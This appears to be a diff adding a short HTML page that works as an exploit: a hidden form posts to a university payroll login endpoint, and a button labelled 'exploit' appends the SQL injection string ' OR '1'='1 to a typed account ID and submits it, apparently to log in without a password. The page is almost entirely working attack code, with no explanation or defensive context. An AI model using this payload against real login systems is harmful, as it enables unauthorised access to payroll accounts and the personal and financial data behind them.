@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+.yo {
+    font-size: 40px;
+}
+</style>
+</head>
+<body>
+	<center>
+	<form action="http://payroll.gatech.edu/index.php" method="POST">
+		<input type="hidden" name="login" value=""/>
+		<input type="hidden" name="action" value="login"/>
+	</form>
+	<p class="yo">&#9787;</p>
+	<p>Enter a valid account login ID below</p>
+	<input id="accountloginid" value="">
+	<br><br>
+	<button id="exploit" onclick="getLoginID()">Click me</button>
+	<script>
+	function getLoginID(){
+  		document.getElementsByName("login")[0].value=document.getElementById("accountloginid").value+"' OR '1'='1";
+  		document.forms[0].submit()}
+	</script>
+	</center>
+</body>
+</html>
